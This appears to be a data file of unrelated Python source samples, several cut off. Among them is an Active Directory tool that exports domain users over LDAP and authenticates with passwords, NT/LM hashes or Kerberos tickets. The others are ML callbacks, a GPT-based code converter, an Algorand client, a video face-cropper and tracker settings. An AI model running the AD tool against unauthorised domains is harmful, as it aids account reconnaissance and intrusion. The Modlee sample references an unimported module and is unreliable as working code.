    "\"\"\" \nModlee model for images. \n\"\"\"\nimport inspect\nfrom typing import Any, Optional\nimport lightning.pytorch as pl\nfrom lightning.pytorch import Trainer, LightningModule\nfrom lightning.pytorch.utilities.types import STEP_OUTPUT\n\nimport mlflow\nfrom modlee import data_metafeatures\nfrom modlee.model import ModleeModel, DataMetafeaturesCallback\nfrom lightning.pytorch.callbacks import Callback\n\nimport torchmetrics\nfrom torchmetrics import Accuracy\n\nTASK_METRIC = {\"classification\": \"Accuracy\", \"regression\": \"MeanSquaredError\"}\n\n\nclass ModleeImageModel(ModleeModel):\n    \"\"\"\n    Subclass of ModleeModel with image-specific convenience wrappers\n\n    - Logs classification accuracy\n    - Calculates data-specific data statistics\n    \"\"\"\n\n    def __init__(self,\n        task=\"classification\",\n        num_classes=None, *args, **kwargs):\n        \"\"\" \n        ModleeImageModel constructor.\n        \n        :param task: The task ('classification','segmentation')\n        :param num_classes: The number of classes, defaults to None.\n        \"\"\"\n        if not num_classes:\n            raise AttributeError(\"Must provide argument for num_classes\")\n        else:\n            self.num_classes = num_classes\n        self.task = task\n        vars_cache = {\"num_classes\": num_classes, \"task\": task}\n        # self.image_callback = ImageCallback(\n        #     metric = TASK_METRIC[self.task],\n        #     **kwargs\n        # )\n        ModleeModel.__init__(self, kwargs_cache=vars_cache, *args, **kwargs)\n\n    def configure_callbacks(self):\n        \"\"\" \n        Configure image-specific callbacks.\n        \"\"\"\n        base_callbacks = ModleeModel.configure_callbacks(self)\n        # save accuracy\n        # image_callback = self.image_callback\n        image_callback = ImageCallback(self.num_classes)\n        # save image-specific datastats\n        image_datastats_callback = DataMetafeaturesCallback(\n            DataMetafeatures=getattr(modlee.data_metafeatures, \"ImageDataMetafeatures\", None)\n        )\n        return [*base_callbacks, image_callback, image_datastats_callback]\n\n\nclass ImageCallback(Callback):\n    \"\"\"\n    Saves accuracy\n    \"\"\"\n\n    def __init__(self, num_classes=2, *args, **kwargs):\n        \"\"\"\n        Constructor for ImageCallback.\n\n        :param num_classes: The number of classes, defaults to 2 (binary classification)2 (binary classification)\n        \"\"\"\n        Callback.__init__(self, *args, **kwargs)\n        self.calculate_accuracy = Accuracy(\n            task=\"binary\" if num_classes == 1 else \"multiclass\", num_classes=num_classes\n        )\n\n    def on_validation_batch_end(\n        self,\n        trainer: Trainer,\n        pl_module: LightningModule,\n        outputs: STEP_OUTPUT | None,\n        batch: Any,\n        batch_idx: int,\n        dataloader_idx: int = 0,\n    ) -> None:\n        if batch_idx == 0:\n            self._calculate_accuracy(pl_module, batch)\n        return super().on_validation_batch_end(\n            trainer, pl_module, outputs, batch, batch_idx, dataloader_idx\n        )\n\n    def _calculate_accuracy(self, pl_module, batch):\n        \"\"\" \n        Calculate batch accuracy.\n        \n        :param pl_module: The model as a module.\n        :param batch: The data batch.\n        \"\"\"\n        data, targets = batch\n        preds = pl_module(data)\n        self.calculate_accuracy.to(device=pl_module.device)\n        acc = self.calculate_accuracy(preds, targets)\n        mlflow.log_metric(\"val_acc\", acc)\n\n",
    "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n# File name          : UsersWithPwdLastSetOlderThan.py\n# Author             : Podalirius (@podalirius_)\n# Date created       : 19 May 2022\n\nimport datetime\nimport xlsxwriter\nfrom impacket.examples import logger, utils\nfrom impacket import version\nfrom impacket.smbconnection import SMBConnection, SMB2_DIALECT_002, SMB2_DIALECT_21, SMB_DIALECT, SessionError\nfrom impacket.spnego import SPNEGO_NegTokenInit, TypesMech\nimport argparse\nimport binascii\nimport ldap3\nimport logging\nimport os\nimport ssl\nimport sys\n\n\ndef get_domain_users(ldap_server, ldap_session, attrs=[\"*\"]):\n    ts_never_low  = datetime.datetime(1601,  1,  1,  0,  0, tzinfo=datetime.timezone.utc)\n    ts_never_high = datetime.datetime(9999, 12, 31, 23, 59, 59, 999999, tzinfo=datetime.timezone.utc)\n    results = {}\n    target_dn = ldap_server.info.other[\"defaultNamingContext\"]\n    ldap_session.search(target_dn, \"(&(objectCategory=person)(pwdLastSet=*))\", attributes=attrs)\n    for entry in ldap_session.response:\n        if entry['type'] != 'searchResEntry':\n            continue\n        results[entry['dn']] = {}\n        for attrname in attrs:\n            if attrname in ['name', 'sAMAccountName', 'distinguishedName']:\n                results[entry['dn']][attrname] = entry[\"attributes\"][attrname]\n\n            elif attrname in ['memberOf', 'description']:\n                results[entry['dn']][attrname] = '\\n'.join(entry[\"attributes\"][attrname])\n\n            elif attrname in ['adminCount', 'logonCount']:\n                results[entry['dn']][attrname] = entry[\"attributes\"][attrname]\n                if (type(entry[\"attributes\"][attrname]) == list):\n                    if (len(entry[\"attributes\"][attrname]) == 0):\n                        results[entry['dn']][attrname] = 0\n\n            elif attrname in ['whenCreated', 'pwdLastSet', 'lastLogon', 'lastLogoff', 'lastLogonTimestamp', 'accountExpires']:\n                if (type(entry[\"attributes\"][attrname]) == list):\n                    if (len(entry[\"attributes\"][attrname]) == 0):\n                        results[entry['dn']][attrname] = \"Never\"\n                elif (entry[\"attributes\"][attrname] == ts_never_low) or (entry[\"attributes\"][attrname] ==  ts_never_high):\n                    results[entry['dn']][attrname] = \"Never\"\n                else:\n                    results[entry['dn']][attrname] = entry[\"attributes\"][attrname].strftime(\"%m/%d/%Y, %H:%M:%S\")\n\n    return results\n\n\ndef parseArgs():\n    print(\"UsersWithPwdLastSetOlderThan v1.2 - by @podalirius_\\n\")\n\n    parser = argparse.ArgumentParser(add_help=True, description=\"Extract all users from an Active Directory domain to an Excel worksheet.\")\n    \n    parser.add_argument(\"--use-ldaps\", action=\"store_true\", help=\"Use LDAPS instead of LDAP\")\n    parser.add_argument(\"-q\", \"--quiet\", dest=\"quiet\", action=\"store_true\", default=False, help=\"Show no information at all.\")\n    parser.add_argument(\"-debug\", dest=\"debug\", action=\"store_true\", default=False, help=\"Debug mode.\")\n    parser.add_argument(\"-no-colors\", dest=\"colors\", action=\"store_false\", default=True, help=\"Disables colored output mode\")\n    parser.add_argument(\"-o\", \"--output-file\", dest=\"output_file\", type=str, default=None, required=False, help=\"Output file to store the results in. (default: accounts.xlsx)\")\n\n    parser.add_argument(\"-D\", \"--days\", default=365, type=int, help=\"Number of days since last password change.\")\n\n    authconn = parser.add_argument_group(\"authentication & connection\")\n    authconn.add_argument(\"--dc-ip\", required=True, action=\"store\", metavar=\"ip address\", help=\"IP Address of the domain controller or KDC (Key Distribution Center) for Kerberos. If omitted it will use the domain part (FQDN) specified in the identity parameter\")\n    authconn.add_argument(\"-d\", \"--domain\", dest=\"auth_domain\", metavar=\"DOMAIN\", action=\"store\", help=\"(FQDN) domain to authenticate to\")\n    authconn.add_argument(\"-u\", \"--user\", dest=\"auth_username\", metavar=\"USER\", action=\"store\", help=\"user to authenticate with\")\n\n    secret = parser.add_argument_group()\n    cred = secret.add_mutually_exclusive_group()\n    cred.add_argument(\"--no-pass\", action=\"store_true\", help=\"Don't ask for password (useful for -k)\")\n    cred.add_argument(\"-p\", \"--password\", dest=\"auth_password\", metavar=\"PASSWORD\", action=\"store\", help=\"Password to authenticate with\")\n    cred.add_argument(\"-H\", \"--hashes\", dest=\"auth_hashes\", action=\"store\", metavar=\"[LMHASH:]NTHASH\", help=\"NT/LM hashes, format is LMhash:NThash\")\n    cred.add_argument(\"--aes-key\", dest=\"auth_key\", action=\"store\", metavar=\"hex key\", help=\"AES key to use for Kerberos Authentication (128 or 256 bits)\")\n    secret.add_argument(\"-k\", \"--kerberos\", dest=\"use_kerberos\", action=\"store_true\", help=\"Use Kerberos authentication. Grabs credentials from .ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line\")\n\n    if len(sys.argv) == 1:\n      ",
    "import os\nimport sys\nimport openai\nfrom pyparsing import QuotedString\nimport platform\n\ndef get_api_key_path():\n    if platform.system() == 'Windows':\n        api_key_path = os.path.join(os.getenv('APPDATA'), '.apikey')\n    elif platform.system() == 'Darwin':\n        api_key_path = os.path.expanduser('~/.apikey')\n    else:\n        api_key_path = os.path.expanduser('~/.apikey')\n    return api_key_path\n\ndef load_api_key(api_key_path):\n    with open(api_key_path, 'r') as file:\n        api_key = file.read().strip()\n    return api_key\n\ndef save_api_key(api_key, api_key_path):\n    with open(api_key_path, 'w') as file:\n        file.write(api_key)\n\ndef process_lpy_file(file_path):\n    with open(file_path, 'r') as file:\n        content = file.read()\n        \n    print(\"reached\")\n\n    csm_snippets = QuotedString('`', multiline=True).setParseAction(lambda t: t[0][1:-1]).searchString(content)\n\n    for snippet in csm_snippets:\n        if '[csm]' in snippet:\n            code_snippet = snippet.split('[csm]')[1].strip()\n            print(f\"Processing code snippet: {code_snippet}\")\n            converted_code = convert_with_chatgpt(code_snippet)\n            content = content.replace(f'`{snippet}`', converted_code)\n\n    py_file_path = file_path.replace('.lpy', '.py')\n    \n    if os.path.exists(py_file_path):\n        os.remove(py_file_path)\n    \n    with open(py_file_path, 'w') as file:\n        file.write(content)\n\n    while True:\n        try:\n            compile(content, py_file_path, 'exec')\n            print(f\"Successfully compiled: {py_file_path}\")\n            break\n        except SyntaxError as e:\n            print(f\"Compilation error: {str(e)}\")\n            corrected_code = correct_with_chatgpt(content, str(e))\n            content = corrected_code\n            with open(py_file_path, 'w') as file:\n                file.write(content)\n\ndef convert_with_chatgpt(code_snippet):\n    prompt = f\"Please convert the following description / pseudo-code into valid Python:\\n\\n```{code_snippet}```\\n\\nProvide only the converted Python code in your response, without any explanations. Do not include the original description / pseudo-code in your response. You are being queried by an API to generate code so please make do and write code that compiles and do not respond with words or with markdown.\"\n\n    response = openai.chat.completions.create(\n        model=\"gpt-4\",\n        messages=[{\"role\": \"user\", \"content\": prompt}],\n        temperature=0,\n    )\n    print(response.choices[0].message)\n\n    converted_code = response.choices[0].message.content.strip()\n    return converted_code\n\ndef correct_with_chatgpt(code, error_message):\n    prompt = f\"The following Python code has a compilation error:\\n\\n```{code}```\\n\\nError message: {error_message}\\n\\nPlease correct the code and provide only the corrected Python code in your response, without any explanations. You are being queried by an API to generate code so please make do and write code that compiles and do not respond with words or with markdown.\"\n\n    response = openai.chat.completions.create(\n        model=\"gpt-4\",\n        messages=[{\"role\": \"user\", \"content\": prompt}],\n        temperature=0,\n    )\n\n    corrected_code = response.choices[0].message.content.strip()\n    return corrected_code\n\nif __name__ == '__main__':\n    if len(sys.argv) < 2:\n        print(\"Please provide the path to the .lpy file as a command-line argument.\")\n        sys.exit(1)\n\n    lpy_file_path = sys.argv[1]\n\n    api_key_path = get_api_key_path()\n\n    if '-a' in sys.argv:\n        api_key_index = sys.argv.index('-a') + 1\n        if api_key_index < len(sys.argv):\n            api_key = sys.argv[api_key_index]\n            save_api_key(api_key, api_key_path)\n        else:\n            print(\"Please provide an API key after the -a flag.\")\n            sys.exit(1)\n    else:\n        try:\n            api_key = load_api_key(api_key_path)\n        except FileNotFoundError:\n            print(f\"API key file not found at {api_key_path}. Please provide an API key using the -a flag.\")\n            sys.exit(1)\n\n    openai.api_key = api_key\n\n    process_lpy_file(lpy_file_path)",
    "# flake8: noqa\n# fmt: off\n# mypy: disable-error-code=\"no-any-return, no-untyped-call, misc, type-arg\"\n# This file was automatically generated by algokit-client-generator.\n# DO NOT MODIFY IT BY HAND.\n# requires: algokit-utils@^1.2.0\nimport base64\nimport dataclasses\nimport decimal\nimport typing\nfrom abc import ABC, abstractmethod\n\nimport algokit_utils\nimport algosdk\nfrom algosdk.v2client import models\nfrom algosdk.atomic_transaction_composer import (\n    AtomicTransactionComposer,\n    AtomicTransactionResponse,\n    SimulateAtomicTransactionResponse,\n    TransactionSigner,\n    TransactionWithSigner\n)\n\n_APP_SPEC_JSON = r\"\"\"{\n    \"hints\": {\n        \"increment()uint64\": {\n            \"call_config\": {\n                \"no_op\": \"CALL\"\n            }\n        }\n    },\n    \"source\": {\n        \"approval\": \"I3ByYWdtYSB2ZXJzaW9uIDEwCgpzbWFydF9jb250cmFjdHMuY291bnRlci5jb250cmFjdC5Db3VudGVyLmFwcHJvdmFsX3Byb2dyYW06CiAgICB0eG4gQXBwbGljYXRpb25JRAogICAgYm56IG1haW5fZW50cnlwb2ludEAyCiAgICBjYWxsc3ViIF9faW5pdF9fCgptYWluX2VudHJ5cG9pbnRAMjoKICAgIC8vIHNtYXJ0X2NvbnRyYWN0cy9jb3VudGVyL2NvbnRyYWN0LnB5OjI0CiAgICAvLyBjbGFzcyBDb3VudGVyKEFSQzRDb250cmFjdCk6CiAgICB0eG4gTnVtQXBwQXJncwogICAgYnogbWFpbl9iYXJlX3JvdXRpbmdANwogICAgbWV0aG9kICJpbmNyZW1lbnQoKXVpbnQ2NCIKICAgIHR4bmEgQXBwbGljYXRpb25BcmdzIDAKICAgIG1hdGNoIG1haW5faW5jcmVtZW50X3JvdXRlQDQKICAgIGVyciAvLyByZWplY3QgdHJhbnNhY3Rpb24KCm1haW5faW5jcmVtZW50X3JvdXRlQDQ6CiAgICAvLyBzbWFydF9jb250cmFjdHMvY291bnRlci9jb250cmFjdC5weTozNQogICAgLy8gQGFyYzQuYWJpbWV0aG9kKCkKICAgIHR4biBPbkNvbXBsZXRpb24KICAgICEKICAgIGFzc2VydCAvLyBPbkNvbXBsZXRpb24gaXMgTm9PcAogICAgdHhuIEFwcGxpY2F0aW9uSUQKICAgIGFzc2VydCAvLyBpcyBub3QgY3JlYXRpbmcKICAgIGNhbGxzdWIgaW5jcmVtZW50CiAgICBieXRlIDB4MTUxZjdjNzUKICAgIHN3YXAKICAgIGNvbmNhdAogICAgbG9nCiAgICBpbnQgMQogICAgcmV0dXJuCgptYWluX2JhcmVfcm91dGluZ0A3OgogICAgLy8gc21hcnRfY29udHJhY3RzL2NvdW50ZXIvY29udHJhY3QucHk6MjQKICAgIC8vIGNsYXNzIENvdW50ZXIoQVJDNENvbnRyYWN0KToKICAgIHR4biBPbkNvbXBsZXRpb24KICAgIHN3aXRjaCBtYWluX2NyZWF0ZUA4IG1haW5fb3B0X2luQDkKICAgIGVyciAvLyByZWplY3QgdHJhbnNhY3Rpb24KCm1haW5fY3JlYXRlQDg6CiAgICAvLyBzbWFydF9jb250cmFjdHMvY291bnRlci9jb250cmFjdC5weToyNAogICAgLy8gY2xhc3MgQ291bnRlcihBUkM0Q29udHJhY3QpOgogICAgdHhuIEFwcGxpY2F0aW9uSUQKICAgICEKICAgIGFzc2VydCAvLyBpcyBjcmVhdGluZwogICAgaW50IDEKICAgIHJldHVybgoKbWFpbl9vcHRfaW5AOToKICAgIC8vIHNtYXJ0X2NvbnRyYWN0cy9jb3VudGVyL2NvbnRyYWN0LnB5OjMwCiAgICAvLyBAYXJjNC5iYXJlbWV0aG9kKGFsbG93X2FjdGlvbnM9WyJPcHRJbiJdKQogICAgdHhuIEFwcGxpY2F0aW9uSUQKICAgIGFzc2VydCAvLyBpcyBub3QgY3JlYXRpbmcKICAgIC8vIHNtYXJ0X2NvbnRyYWN0cy9jb3VudGVyL2NvbnRyYWN0LnB5OjMwLTMxCiAgICAvLyBAYXJjNC5iYXJlbWV0aG9kKGFsbG93X2FjdGlvbnM9WyJPcHRJbiJdKQogICAgLy8gZGVmIG9wdF9pbihzZWxmKSAtPiBOb25lOgogICAgY2FsbHN1YiBvcHRfaW4KICAgIGludCAxCiAgICByZXR1cm4KCgovLyBzbWFydF9jb250cmFjdHMuY291bnRlci5jb250cmFjdC5Db3VudGVyLmluY3JlbWVudCgpIC0+IGJ5dGVzOgppbmNyZW1lbnQ6CiAgICAvLyBzbWFydF9jb250cmFjdHMvY291bnRlci9jb250cmFjdC5weTozNS0zNgogICAgLy8gQGFyYzQuYWJpbWV0aG9kKCkKICAgIC8vIGRlZiBpbmNyZW1lbnQoc2VsZikgLT4gYXJjNC5VSW50NjQ6CiAgICBwcm90byAwIDEKICAgIC8vIHNtYXJ0X2NvbnRyYWN0cy9jb3VudGVyL2NvbnRyYWN0LnB5OjM3CiAgICAvLyBhc3NlcnQgVHhuLnNlbmRlci5pc19vcHRlZF9pbigKICAgIHR4biBTZW5kZXIKICAgIC8vIHNtYXJ0X2NvbnRyYWN0cy9jb3VudGVyL2NvbnRyYWN0LnB5OjM4CiAgICAvLyBHbG9iYWwuY3VycmVudF9hcHBsaWNhdGlvbl9pZAogICAgZ2xvYmFsIEN1cnJlbnRBcHBsaWNhdGlvbklECiAgICAvLyBzbWFydF9jb250cmFjdHMvY291bnRlci9jb250cmFjdC5weTozNy0zOQogICAgLy8gYXNzZXJ0IFR4bi5zZW5kZXIuaXNfb3B0ZWRfaW4oCiAgICAvLyAgICAgR2xvYmFsLmN1cnJlbnRfYXBwbGljYXRpb25faWQKICAgIC8vICksICJTZW5kZXIgbXVzdCBvcHQtaW4gdG8gdGhlIGNvbnRyYWN0IgogICAgYXBwX29wdGVkX2luCiAgICBhc3NlcnQgLy8gU2VuZGVyIG11c3Qgb3B0LWluIHRvIHRoZSBjb250cmFjdAogICAgLy8gc21hcnRfY29udHJhY3RzL2NvdW50ZXIvY29udHJhY3QucHk6NDAKICAgIC8vIHNlbGYuY291bnRbVHhuLnNlbmRlcl0gKz0gMQogICAgdHhuIFNlbmRlcgogICAgaW50IDAKICAgIGJ5dGUgImNvdW50IgogICAgYXBwX2xvY2FsX2dldF9leAogICAgYXNzZXJ0IC8vIGNoZWNrIGNvdW50IGV4aXN0cyBmb3IgYWNjb3VudAogICAgaW50IDEKICAgICsKICAgIHR4biBTZW5kZXIKICAgIGJ5dGUgImNvdW50IgogICAgdW5jb3ZlciAyCiAgICBhcHBfbG9jYWxfcHV0CiAgICAvLyBzbWFydF9jb250cmFjdHMvY291bnRlci9jb250cmFjdC5weTo0MQogICAgLy8gcmV0dXJuIGFyYzQuVUludDY0KHNlbGYuY291bnRbVHhuLnNlbmRlcl0pCiAgICB0eG4gU2VuZGVyCiAgICBpbnQgMAogICAgYnl0ZSAiY291bnQiCiAgICBhcHBfbG9jYWxfZ2V0X2V4CiAgICBhc3NlcnQgLy8gY2hlY2sgY291bnQgZXhpc3RzIGZvciBhY2NvdW50CiAgICBpdG9iCiAgICByZXRzdWIKCgovLyBzbWFydF9jb250cmFjdHMuY291bnRlci5jb250cmFjdC5Db3VudGVyLm9wdF9pbigpIC0+IHZvaWQ6Cm9wdF9pbjoKICAgIC8vIHNtYXJ0X2NvbnRyYWN0cy9jb3VudGVyL2NvbnRyYWN0LnB5OjMwLTMxCiAgICAvLyBAYXJjNC5iYXJlbWV0aG9kKGFsbG93X2FjdGlvbnM9WyJPcHRJbiJdKQogICAgLy8gZGVmIG9wdF9pbihzZWxmKSAtPiBOb25lOgogICAgcHJvdG8gMCAwCiAgICAvLyBzbWFydF9jb250cmFjdHMvY291bnRlci9jb250cmFjdC5weTozMgogICAgLy8gc2VsZi5jb3VudFtUeG4uc2VuZGVyXSA9IFVJbnQ2NCgwKQogICAgdHhuIFNlbmRlcgogICAgYnl0ZSAiY291bnQiCiAgICBpbnQgMAogICAgYXBwX2xvY2FsX3B1dAogICAgLy8gc21hcnRfY29udHJhY3RzL2NvdW50ZXIvY29udHJhY3QucHk6MzMKICAgIC8vIHNlbGYuY291bnRlci52YWx1ZSArPSAxCiAgICBpbnQgMAogICAgYnl0ZSAiY291bnRlciIKICAgIGFwcF9nbG9iYWxfZ2V0X2V4CiAgICBhc3NlcnQgLy8gY2hlY2sgY291bnRlciBleGlzdHMKICAgIGludCAxCiAgICArCiAgICBieXRlICJjb3VudGVyIgogICAgc3dh",
    "import cv2\nimport subprocess\nimport dlib\nimport os\nimport argparse\nargs = parser = argparse.ArgumentParser()\nparser.add_argument('--path', type=str,default='')\nopt = parser.parse_args()\n#\u53c2\u6570\u5217\u8868\ninputFile = opt.path\n#\u6700\u7ec8\u751f\u6210\u7684video\u7684\u8def\u5f84\uff0c\u9ed8\u8ba4\u8f93\u51fa\u5728inputfile\u7684\u4e0a\u4e00\u7ea7\u6587\u4ef6\u5939\noutputFolder = os.path.join(inputFile,'../')\n# \u901a\u5e38\u4f60\u4f1a\u60f3\u8981\u89c4\u8303\u5316\u8def\u5f84\uff0c\u6d88\u9664\u8def\u5f84\u4e2d\u7684 '../'\u7528\u4e8e\u8bc6\u522b.\noutputFolder = os.path.normpath(outputFolder)\n#\u6700\u7ec8\u751f\u6210\u7684\u89c6\u9891\u5e27\u7684\u8def\u5f84\noutputFamesFolder=os.path.join(outputFolder,'frames')\nif(os.path.exists(outputFamesFolder) == False):\n    os.makedirs(outputFamesFolder)\n#video_name\nname = inputFile.split('/')[-1].split('.')[0]\n#\u88c1\u526a\u7684\u97f3\u9891\u7684\u8f93\u51fa\naudio_output=os.path.join(outputFolder,'val_wavs')\nif(os.path.exists(audio_output)== False):\n    os.makedirs(audio_output)\n    \n# \u521d\u59cb\u5316dlib\u7684\u4eba\u8138\u68c0\u6d4b\u5668\ndetector = dlib.get_frontal_face_detector()\ndef get_face_coordinates(image):\n    # cv\u8bfb\u53d6\u7684\u56fe\u7247\u8f6c\u4e3aRGB\u683c\u5f0f\n    rgb_image = cv2.cvtColor(image, cv2.COLOR_BGR2RGB)\n    \n    # \u4f7f\u7528dlib\u7684\u4eba\u8138\u68c0\u6d4b\u5668\u68c0\u6d4b\u4eba\u8138\n    detections = detector(rgb_image)\n    \n    if len(detections) > 0:\n        face = detections[0]\n        # \u8ba1\u7b97\u5e76\u8fd4\u56de\u4eba\u8138\u4e2d\u5fc3\u70b9\n        center_x = (face.left() + face.right()) // 2\n        center_y = (face.top() + face.bottom()) // 2\n        return center_x, center_y\n    else:\n        return None\n\n# \u8bfb\u53d6\u89c6\u9891\nvideo_capture = cv2.VideoCapture(inputFile)\n# \u83b7\u53d6\u7b2c\u4e00\u5e27\u7684\u4eba\u8138\u5750\u6807\nret, first_frame = video_capture.read()\nface_coords = get_face_coordinates(first_frame)\n\nif face_coords is not None:\n    center_x, center_y = face_coords\n    print(\"Center coordinates of the first detected face:\", center_x, center_y)\nelse:\n    print(\"No face detected in the first frame.\")\n\n\ntargetWH=512\ncrop_size = targetWH//2  \n#crop_size = 512 \nstart_x = max(center_x - crop_size, 0)\nstart_y = max(center_y - crop_size, 0)\n\n#\u6839\u636e\u7b2c\u4e00\u5e27\u7684\u4eba\u8138\u5750\u6807\u4fe1\u606f,\u9010\u5e27\u8fdb\u884c\u88c1\u526a\nframe_number = 0\nwhile video_capture.isOpened():\n    ret, frame = video_capture.read()\n    if not ret:\n        break\n    cropped_image = frame[start_y:start_y + targetWH, start_x:start_x + targetWH]\n    frame_filename = f\"{outputFamesFolder}/frame_{frame_number:04d}.png\"\n    cv2.imwrite(frame_filename, cropped_image)\n    frame_number += 1\n\nvideo_capture.release()\n\n# \u63d0\u53d6\u89c6\u9891\u7684\u97f3\u9891\ncmd = [\n    \"ffmpeg\",\n    \"-i\",inputFile,\n    '-f','wav',\n    '-ar','16000',\n    '-y',f\"{audio_output}/{name}_audio.wav\"\n]\n\nout = subprocess.run(cmd,\\\n        stdout=subprocess.PIPE,\\\n        stderr=subprocess.STDOUT,\\\n        text=True)\ntargetFps=25\nframe_pattern = f\"{outputFamesFolder}/frame_%04d.png\"\n\n#\u628a\u88c1\u526a\u4eba\u8138\u540e\u7684\u89c6\u9891\u5e27\u548c\u97f3\u9891\u65e0\u635f\u5408\u5e76\u4e3a \u6700\u7ec8\u7684\u89c6\u9891\ncmd =[\n    \"ffmpeg\",\n    \"-i\",frame_pattern,\n    \"-i\",f\"{audio_output}/{name}_audio.wav\",\n    \"-c:v\",\"libx264\",\n    \"-framerate\", str(targetFps),\n    '-pix_fmt', 'yuv420p',\n    \"-y\",f\"{outputFolder}/{name}_face_crop.mp4\"\n]\n\nout = subprocess.run(cmd)\n",
    "import os\nimport json\nimport traceback\n\nimport requests\n\n\nclass Settings:\n    def __init__(self):\n        self.data_folder = \"./data/\"\n        self.default_settings = {\n            \"directories\": [],\n            \"tmdb_key\": \"\",  # https://www.themoviedb.org/settings/api\n            \"enabled_sites\": [],\n            \"keys\": {\n                \"aither\": \"\",\n                \"blutopia\": \"\",\n                \"fearnopeer\": \"\",\n                \"reelflix\": \"\",\n                \"lst\": \"\",\n                \"ulcx\": \"\",\n                \"onlyencodes\": \"\",\n            },\n            \"gg_path\": \"\",  # Path to GG-Bot e.g. /home/user/gg-bot-upload-assistant/ --- Not required only for export_gg_bot()\n            \"search_cooldown\": 5,  # In seconds. Anything less than 3 isn't recommended. 30 requests per minute is max before hit rate limits. - HDVinnie\n            \"min_file_size\": 800,  # In MB\n            \"allow_dupes\": True,  # If false only check for completely unique movies\n            \"banned_groups\": [],\n            \"ignored_qualities\": [\n                \"dvdrip\",\n                \"webrip\",\n                \"bdrip\",\n                \"cam\",\n                \"ts\",\n                \"telesync\",\n                \"hdtv\",\n            ],  # See patterns.py for valid options, note \"bluray\" get's changed to encode in scan_directories()\n            \"ignored_keywords\": [\n                \"10bit\",\n                \"10-bit\",\n                \"DVD\",\n            ],  # This could be anything that would end up in the excess of parsed filename.\n        }\n        self.tracker_nicknames = {\n            \"fnp\": \"fearnopeer\",\n            \"fearnopeer\": \"fearnopeer\",\n            \"reelflix\": \"reelflix\",\n            \"rfx\": \"reelflix\",\n            \"aither\": \"aither\",\n            \"aith\": \"aither\",\n            \"blu\": \"blutopia\",\n            \"blutopia\": \"blutopia\",\n            \"lst\": \"lst\",\n            \"ulcx\": \"upload.cx\",\n            \"upload.cx\": \"upload.cx\",\n            \"upload.cx\": \"ulcx\",\n            \"onlyencodes\": \"oe\",\n            \"oe\": \"onlyencodes\",\n        }\n\n        # Basic hierarchy for qualities used to see if a file is an upgrade\n        self.quality_hierarchy = {\n            \"webrip\": 0,\n            \"web-dl\": 1,\n            \"encode\": 2,\n            \"remux\": 3,\n        }\n        self.current_settings = None\n        self.tracker_info = None\n\n        try:\n            # Creating settings.json with default settings\n            if (\n                not os.path.exists(f\"{self.data_folder}settings.json\")\n                or os.path.getsize(f\"{self.data_folder}settings.json\") < 10\n            ):\n                with open(f\"{self.data_folder}settings.json\", \"w\") as outfile:\n                    json.dump(self.default_settings, outfile)\n            # Load settings.json\n            if os.path.getsize(f\"{self.data_folder}settings.json\") > 10:\n                with open(f\"{self.data_folder}settings.json\", \"r\") as file:\n                    self.current_settings = json.load(file)\n                    self.validate_directories()\n            # Set the settings to our class\n            if not self.current_settings:\n                self.current_settings = self.default_settings\n            # Load tracker_info.json used for resolution mapping\n            if not self.tracker_info:\n                with open(\"tracker_info.json\", \"r\") as file:\n                    self.tracker_info = json.load(file)\n        except Exception as e:\n            print(\"Error initializing settings: \", e)\n\n    # Clean directories from loaded settings\n    def validate_directories(self):\n        try:\n            directories = self.current_settings[\"directories\"]\n            directories = list(set(directories))\n            # Remove trailing slashes for os.path.commonpath\n            clean = [\n                dir_path[:-1]\n                if dir_path[-1] == \"\\\\\" or dir_path[-1] == \"/\"\n                else dir_path\n                for dir_path in directories\n            ]\n            clean_copy = clean\n            if len(clean) > 1:\n                for dir_path in clean:\n                    # Check if the directory exists\n                    if os.path.exists(dir_path):\n                        drive, tail = os.path.splitdrive(dir_path)\n                        if drive and not tail.strip(\"\\\\/\"):\n                            print(\n                                f\"{dir_path} is a root directory, removing child directories\"\n                            )\n                            clean_copy = [\n                                c for c in clean_copy if not c.startswith(drive[0])\n                            ]\n                            clean_copy.append(dir_path)\n                            continue\n                        elif dir_path in clean_copy:\n                            is_subpath = False\n                            child_path = None\n                            parent_path = None\n                            for other_dir in clean_copy:\n                                if (\n                                ",
    "\"\"\"\nDO NOT MODIFY\nThis file is used to validate your publish settings.\n\"\"\"\nfrom __future__ import print_function\n\nimport os\nimport sys\nimport importlib\n\n\ncomponents_package = 'dash_summernote'\n\ncomponents_lib = importlib.import_module(components_package)\n\nmissing_dist_msg = 'Warning {} was not found in `{}.__init__.{}`!!!'\nmissing_manifest_msg = '''\nWarning {} was not found in `MANIFEST.in`!\nIt will not be included in the build!\n'''\n\nwith open('MANIFEST.in', 'r') as f:\n    manifest = f.read()\n\n\ndef check_dist(dist, filename):\n    # Support the dev bundle.\n    if filename.endswith('dev.js'):\n        return True\n\n    return any(\n        filename in x\n        for d in dist\n        for x in (\n            [d.get('relative_package_path')]\n            if not isinstance(d.get('relative_package_path'), list)\n            else d.get('relative_package_path')\n        )\n    )\n\n\ndef check_manifest(filename):\n    return filename in manifest\n\n\ndef check_file(dist, filename):\n    if not check_dist(dist, filename):\n        print(\n            missing_dist_msg.format(filename, components_package, '_js_dist'),\n            file=sys.stderr\n        )\n    if not check_manifest(filename):\n        print(missing_manifest_msg.format(filename),\n              file=sys.stderr)\n\n\nfor cur, _, files in os.walk(components_package):\n    for f in files:\n\n        if f.endswith('js'):\n            # noinspection PyProtectedMember\n            check_file(components_lib._js_dist, f)\n        elif f.endswith('css'):\n            # noinspection PyProtectedMember\n            check_file(components_lib._css_dist, f)\n        elif not f.endswith('py'):\n            check_manifest(f)\n",
